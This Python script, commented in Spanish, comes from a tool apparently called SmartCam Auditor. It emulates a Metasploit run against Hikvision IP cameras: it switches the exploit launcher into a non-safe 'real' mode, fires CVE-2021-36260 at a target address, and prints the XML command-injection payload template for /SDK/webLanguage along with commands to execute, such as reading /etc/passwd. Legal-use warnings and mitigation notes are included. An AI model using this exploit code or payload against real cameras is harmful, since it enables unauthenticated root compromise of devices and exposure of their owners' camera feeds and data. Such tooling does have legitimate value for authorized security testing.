#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
SmartCam Auditor - Emulador de Comandos Metasploit
Ejecuta exactamente los comandos que proporcionaste:
use auxiliary/scanner/http/hikvision_cmd_injection
set RHOSTS 192.168.1.10
set TARGETURI /SDK/webLanguage
run
"""

import sys
import os
import json

# Agregar el directorio padre al path
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

def execute_metasploit_commands():
    """
    Ejecuta los comandos exactos proporcionados por el usuario
    """
    print("🚀 SmartCam Auditor - Emulador Metasploit")
    print("=" * 60)
    print("Ejecutando comandos Metasploit equivalentes:")
    print()
    
    # Comandos originales del usuario
    commands = [
        "use auxiliary/scanner/http/hikvision_cmd_injection",
        "set RHOSTS 192.168.1.10", 
        "set TARGETURI /SDK/webLanguage",
        "run"
    ]
    
    # Mostrar comandos
    print("msf6 > " + commands[0])
    print("msf6 auxiliary(scanner/http/hikvision_cmd_injection) > " + commands[1])
    print("msf6 auxiliary(scanner/http/hikvision_cmd_injection) > " + commands[2])
    print("msf6 auxiliary(scanner/http/hikvision_cmd_injection) > " + commands[3])
    print()
    
    # Configuración extraída de los comandos
    MODULE = "auxiliary/scanner/http/hikvision_cmd_injection"
    RHOSTS = "192.168.1.10"
    TARGETURI = "/SDK/webLanguage"
    RPORT = 80  # Puerto por defecto
    
    print(f"[*] Module: {MODULE}")
    print(f"[*] RHOSTS: {RHOSTS}")
    print(f"[*] RPORT: {RPORT}")
    print(f"[*] TARGETURI: {TARGETURI}")
    print()
    
    try:
        print("[*] Loading SmartCam Auditor modules...")
        
        # Importar módulos
        from scanner.network_scanner import NetworkScanner
        from scanner.exploit_launcher import ExploitLauncher
        
        # Configurar para modo real (como Metasploit)
        config = {
            "exploit_safe_mode": False,  # Modo real
            "exploit_timeout": 10,
            "log_exploits": True
        }
        
        # Guardar configuración temporal
        with open("config/metasploit_emulation.json", "w") as f:
            json.dump(config, f, indent=2)
        
        print("[*] Initializing exploit launcher...")
        launcher = ExploitLauncher(config_file="config/metasploit_emulation.json")
        
        print(f"[*] Starting scan against {RHOSTS}...")
        print()
        
        # Ejecutar el exploit (equivalente a 'run')
        resultado = launcher.lanzar_exploit(
            cve_id="CVE-2021-36260",
            ip=RHOSTS,
            port=RPORT
        )
        
        # Mostrar resultados en formato Metasploit
        print("[*] Scan results:")
        print("-" * 40)
        
        if resultado.get('exploit_exitoso'):
            print(f"[+] {RHOSTS}:{RPORT} - Hikvision camera detected")
            print(f"[+] {RHOSTS}:{RPORT} - Command injection successful!")
            print(f"[+] Vulnerable endpoint: {TARGETURI}")
            
            if resultado.get('comando_ejecutado'):
                print(f"[+] Command executed: {resultado['comando_ejecutado']}")
            
            if resultado.get('respuesta_servidor'):
                print(f"[+] Server response:")
                respuesta = resultado['respuesta_servidor']
                if len(respuesta) > 300:
                    print(f"    {respuesta[:300]}...")
                else:
                    print(f"    {respuesta}")
            
            # Información adicional si está disponible
            if resultado.get('evidencia_comando'):
                evidencia = resultado['evidencia_comando']
                if evidencia.get('detected'):
                    print(f"[+] Command evidence detected: {', '.join(evidencia.get('indicators', []))}")
                    print(f"[+] Confidence level: {evidencia.get('confidence', 0)}%")
            
            if resultado.get('comandos_adicionales'):
                print(f"[+] Additional commands executed: {len(resultado['comandos_adicionales'])}")
                for cmd in resultado['comandos_adicionales']:
                    print(f"    -> {cmd.get('comando', 'N/A')}")
            
            print()
            print("[+] Target appears to be vulnerable to CVE-2021-36260")
            print("[!] Command injection possible - device may be compromised")
            
        else:
            print(f"[-] {RHOSTS}:{RPORT} - Not vulnerable")
            print(f"[-] Target did not respond to exploit")
            
            if resultado.get('detalle'):
                print(f"[-] Details: {resultado['detalle']}")
            
            if resultado.get('error'):
                print(f"[-] Error: {resultado['error']}")
        
        print()
        print("[*] Scan completed")
        
        # Estadísticas finales
        stats = launcher.obtener_estadisticas()
        print(f"[*] Total exploit attempts: {stats['total']}")
        print(f"[*] Successful exploits: {stats['exitosos']}")
        print(f"[*] Failed attempts: {stats['fallidos']}")
        print(f"[*] Success rate: {stats['tasa_exito']}%")
        
        return resultado
        
    except ImportError as e:
        print(f"[-] Error loading modules: {e}")
        print("[!] Ensure all SmartCam Auditor modules are available")
        return None
        
    except Exception as e:
        print(f"[-] Exploit execution failed: {e}")
        print(f"[-] Details: {str(e)}")
        return None

def show_payload_details():
    """
    Muestra detalles del payload utilizado
    """
    print("\n📄 PAYLOAD DETAILS:")
    print("=" * 40)
    print("CVE: CVE-2021-36260")
    print("Target: Hikvision IP Cameras")
    print("Type: Remote Command Injection")
    print("Endpoint: /SDK/webLanguage")
    print("Method: POST")
    print("Content-Type: application/xml")
    print()
    print("Payload template:")
    print("<?xml version='1.0' encoding='UTF-8'?>")
    print("<language>$(COMMAND)</language>")
    print()
    print("Default commands tested:")
    print("- id")
    print("- whoami") 
    print("- uname -a")
    print("- cat /etc/passwd")
    print("- ls -la /")
    print("- ps aux")

def show_vulnerability_info():
    """
    Muestra información sobre la vulnerabilidad
    """
    print("\n🔍 VULNERABILITY INFORMATION:")
    print("=" * 50)
    print("CVE ID: CVE-2021-36260")
    print("CVSS Score: 9.8 (Critical)")
    print("Vendor: Hikvision")
    print("Product: IP Cameras and DVRs")
    print("Affected Versions: Multiple firmware versions")
    print()
    print("Description:")
    print("Hikvision IP cameras contain a command injection vulnerability")
    print("in the web service that allows unauthenticated remote command")
    print("execution with root privileges.")
    print()
    print("Impact:")
    print("- Complete system compromise")
    print("- Unauthorized access to camera feeds")
    print("- Use of device in botnet attacks")
    print("- Data theft and privacy violations")
    print()
    print("Mitigation:")
    print("- Update firmware to latest version")
    print("- Implement network segmentation")
    print("- Change default credentials")
    print("- Disable unnecessary web services")

if __name__ == "__main__":
    print("🧪 SmartCam Auditor - Metasploit Command Emulation")
    print("Ejecuta exactamente los comandos Metasploit proporcionados")
    print()
    
    print("⚠️  ADVERTENCIA LEGAL:")
    print("   Este tool debe usarse SOLO en redes propias o con autorización explícita")
    print("   El uso no autorizado puede ser ilegal")
    print()
    
    try:
        # Ejecutar comandos principales
        resultado = execute_metasploit_commands()
        
        # Mostrar información adicional
        show_payload_details()
        show_vulnerability_info()
        
        print("\n" + "="*60)
        print("✅ Emulación de comandos Metasploit completada!")
        
        if resultado and resultado.get('exploit_exitoso'):
            print("🚨 TARGET VULNERABLE DETECTADO!")
            print("⚠️  Toma medidas inmediatas para asegurar el dispositivo")
        
    except KeyboardInterrupt:
        print("\n⚠️ Ejecución cancelada por el usuario")
    except Exception as e:
        print(f"\n❌ Error: {e}")
    
    print("\n💡 Para más funcionalidades, usa los otros scripts del proyecto")
